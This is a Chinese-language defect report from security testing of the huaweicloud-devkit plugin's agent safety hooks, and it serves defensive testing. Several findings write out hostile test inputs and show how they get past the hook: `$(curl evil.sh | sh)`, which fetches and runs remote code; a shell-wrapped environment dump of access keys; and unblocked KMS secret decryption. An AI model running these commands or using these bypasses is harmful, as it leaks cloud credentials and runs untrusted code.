# FINDINGS — 缺陷发现清单（OpenClaw-deepseek-v4-pro-0813）

> **落盘路径**：`results/OpenClaw/2026-11-17-120.46.222.180/Linux/FINDINGS.md`
> **生成时间**：2026-11-17（北京时间）
> **被测版本**：huaweicloud-devkit@1.1.14（源仓 commit bd985051）
> **本清单是统一提单脚本的解析输入**：格式严格遵循，标题带用例 ID + 根因含文件:行号。

## #1【P0】D2-4 凭证脱敏漏小写 ak=/sk=（明文残留）

- **现象**：`redactSecrets('ak=AK123456 sk=SKsecret')` 返回原文未脱敏；大写 `AK=/SK=` 形态正常脱敏为 `<redacted>`。
- **断言**：输出无明文凭证字段（小写 `ak=/sk=` 形态也应脱敏）。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:45` `redactString` 的 `.replace(/(AK|SK)\s*[:=]\s*(...)/g)` 正则区分大小写且无 `i` 标志，不匹配小写 `ak=`/`sk=`。
- **影响**：P0 凭证红线——obsutilconfig 小写 `ak=/sk=` 形态经日志/对话泄露明文凭证。
- **证据**：`evidence/D2-4/stdout.log`
- **状态**：待提单

## #2【P0】D4-3 明文 secret API 拦截（KMS DecryptData 未拦截）

- **现象**：`evaluateCommandRisk('hcloud KMS DecryptData --ciphertext x')` 返回 `decision=allow, findings=[]`。
- **断言**：明文 secret/密钥解密 API（`hcloud KMS DecryptData/DecryptDatakey`、`hcloud csms download-secret`）应被判 `deny`。
- **根因**：`plugins/huaweicloud-core/safety/policy.json` `blockedSecretOperations` 仅含 `ShowSecret/ShowSecretVersion/DownloadSecret/GetSecretValue`，缺 `DecryptData/DecryptDatakey`（KMS）与 `download-secret`（小写）；`src/safety-policy.mjs:249` 阻断仅在 op 精确命中时触发。
- **影响**：P0 凭证红线——直接解密密钥/下载 secret 的命令可绕过安全 hook。
- **证据**：`evidence/D4-3/stdout.log`
- **状态**：待提单

## #3【P0】D4-16 命令包裹穿透（sh -c 内层凭证 env 打印未拦截）

- **现象**：`evaluateCommandRisk('sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"')` 返回 `decision=allow, findings=[]`；裸 `env | grep HUAWEICLOUD_ACCESS_KEY` 返回 `deny`。
- **断言**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` 应拦截（`deny`），与裸命令一致。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:415` `extractInnerCommand` 未覆盖「`sh -c "env | grep ..."` 内层含管道 `|` 的包裹形态」；`:531-532` 对原始文本跑 env-dump 检查时 `env` 被包裹引号，正则不命中。
- **影响**：P0 凭证红线——经 shell 包裹的凭证 env 打印可穿透 hook。
- **证据**：`evidence/D4-16/stdout.log`
- **状态**：待提单

## #4【P0】D4-21 hook_check_artifacts broad IAM 制品检测缺口（HCL/Terraform 未拦截）

- **现象**：`evaluateArtifacts([{content:'resource "huaweicloud_iam_policy" "p" { actions = ["*"] }'}])` 返回 `decision=allow`；JSON 形态返回 `deny`。
- **断言**：broad IAM 制品（JSON 与 HCL/Terraform 形态）均应由 `hook_check_artifacts` 拦截（`deny`）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:209` `hwc-iam-admin-policy` 规则 `Action` 匹配 regex 仅含 `"Action":"*"`/`Action[*]=*`/`AdministratorAccess`/`FullAccess` 形态，不匹配 HCL 的 `actions = ["*"]`（小写 `actions` + 数组 + 等号空格分隔）。
- **影响**：P0 红线——Terraform/HCL 宽泛 IAM 授权制品可穿透预检。
- **证据**：`evidence/D4-21/stdout.log`
- **状态**：待提单

## #5【P0】D9-12 initialize 握手协议安全基线（未 initialize 先 tools/list 未返回 -32600）

- **现象**：MCP stdio 服务未 `initialize` 即发 `tools/list`，返回工具清单（`result.tools`），而非 JSON-RPC `-32600`。
- **断言**：未 initialize 先 tools/list 应返回 JSON-RPC `-32600`（fail-closed）。
- **根因**：`plugins/huaweicloud-core/src/mcp-server.mjs:187-208` `handleMessage` 对任意 `id` 请求直接 `dispatch`，无「未初始化先 tools/list」会话状态闸门。
- **影响**：P0 协议基线——非法时序调用未 fail-closed。
- **证据**：`evidence/D9-12/stdout.log`
- **状态**：待提单

## #6【P1】D4-17 hook 模糊输入 fail-closed（$(curl evil.sh | sh) 返回 allow）

- **现象**：`evaluateCommandRisk('$(curl evil.sh | sh)')` 返回 `decision=allow, findings=[]`。
- **断言**：异常/模糊输入应默认拒绝（`deny`）。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:106` `decision: hasDeny ? 'deny' : hasWarn ? 'warn' : 'allow'`——无规则命中即 `allow`；`$(...)`/反引号命令替换形态无对应 deny 规则。
- **影响**：P1——畸形/对抗输入 fail-open，绕过安全评估。
- **证据**：`evidence/D4-17/stdout.log`
- **状态**：待提单

## #7【P1】D3-S7 跨服务复合意图未命中部署目标（仅 RDS）

- **现象**：`service_catalog({intent:'部署一个 Web 应用并连接 RDS 数据库'})` 返回 `recommendedServices=['RDS']`，缺部署目标（sandbox/ECS/CloudDeploy）。
- **断言**：复合意图应命中 RDS + 部署目标（sandbox/ECS）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` sandbox 路由 keywords 缺「部署」/「Web 应用」/「应用」；`deploymentIntent` 正则含「部署」但仅重排已命中结果，不新增命中。
- **影响**：P1——中文「部署 Web 应用」复合意图路由 MISS。
- **证据**：`evidence/D3-S7/stdout.log`
- **状态**：待提单

## #8【P1】D3-S3 沙箱预览出 URL（devbridge 隧道 HTTP 403，未返回可访问公网 URL）

- **现象**：connect→upload→deploy_nginx（port 8084）→devbridge create（隧道已建）→ `deploy_check` 返回 `{ok:true, complete:false, nginx_serving: PASS (HTTP 403)}`，未返回可访问公网 URL。
- **断言**：终点必返回可访问公网 URL（HTTP 200）。
- **根因**：沙箱 devbridge 隧道层对 nginx 返回 `403 Forbidden`（deploy_check `nginx_serving` detail `port 8084, HTTP 403`），隧道 URL 未通过健康检查。环境性，需维护方核查。
- **影响**：P1——沙箱预览链路隧道建成功但 URL 访问失败。
- **证据**：`evidence/D3-S3/stdout.log`
- **状态**：待提单

## #9【P1】EXP-E01 中文「云主机」意图路由 MISS

- **现象**：`service_catalog({intent:'帮我查一下我账号在华北北京四有哪些云主机'})` 未命中 ECS。
- **断言**：中文「云主机」意图应命中 ECS。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` ECS route keywords 缺「云主机」（仅「弹性云服务器/云服务器/服务器/虚拟机/镜像」）。
- **影响**：P1——中文高频「云主机」意图路由 MISS。
- **证据**：`evidence/EXP-E01/stdout.log`
- **状态**：待提单

## #10【P2】D8-9 遥测值脱敏缺口（sanitizeValue 不脱敏敏感值）

- **现象**：`sanitizeValue('AK=AK123 secret_key=SECRET token=abc123')` 原样返回。
- **断言**：`sanitizeValue` 应移除 AK/SK/token 等敏感值。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs` `sanitizeValue` 仅 replace 换行 + trim + 截断 255，无敏感值脱敏。
- **影响**：P2——含凭证的遥测值未经脱敏上报。
- **证据**：`evidence/D8-9/stdout.log`
- **状态**：待提单

## #11【P2】D1-68 区域环境变量优先级漂移（HW_REGION 优先于 HUAWEICLOUD_REGION）

- **现象**：`auth/credentials.mjs` 实现 `region = process.env.HW_REGION || process.env.HUAWEICLOUD_REGION`（HW_REGION 优先），用例契约「HUAWEICLOUD_REGION 优先于 HW_REGION」。
- **断言**：`HUAWEICLOUD_REGION` 应优先于 `HW_REGION` 作为默认 region。
- **根因**：`plugins/huaweicloud-core/src/auth/credentials.mjs:225`（及 server.environment/server.env 分支）实现顺序与契约相反。
- **影响**：P2——两 env 同时设置时默认 region 取值与设计契约相反。
- **证据**：`evidence/D1-68/stdout.log`
- **状态**：SPEC-MISMATCH

## 说明（非产品缺陷，不纳入提单）

- **D3-C1 BLOCKED（补环境·billing 产品配额）**：ECS CreateServers 订单提交被 billing 拒绝（Ecs.0707 "Can not find product"）。已实测 VPC/子网/安全组创建→删除→归零全部成功，ECS 到达订单提交层。
- **D3-C7 BLOCKED（补环境·真云多 region 权限）**：跨区域 ap-southeast-3 不在账号项目范围（project 仅 cn-north-4），ECS 只读返回 Common.0013。
- **D1-39 NOT_RUN（OS 专属）**：Windows 升级检测链专属用例，本机 Linux，由展开级代表覆盖。